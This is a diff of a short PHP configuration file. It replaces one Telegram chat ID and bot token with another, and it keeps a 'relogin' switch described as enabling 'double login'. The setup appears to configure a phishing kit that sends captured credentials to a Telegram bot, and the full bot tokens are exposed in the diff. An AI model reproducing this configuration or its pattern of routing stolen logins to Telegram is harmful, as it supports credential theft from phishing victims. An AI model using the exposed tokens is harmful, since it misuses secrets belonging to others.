@@ -1,7 +1,7 @@
 <?php
 $mail="";
-$telegram_chat_id="-4766774872";
-$telegram_bot_token="7377976653:AAE1iJ39uL-Pjx10rZCcNsjGo5N0u0ouLCg";
+$telegram_chat_id="737419465";
+$telegram_bot_token="8434532725:AAGg-0wCppk51w5KQyugUrnkUUnSHMo4tKI";
 $relogin=1;// set to one if you want double login
 
 ?>
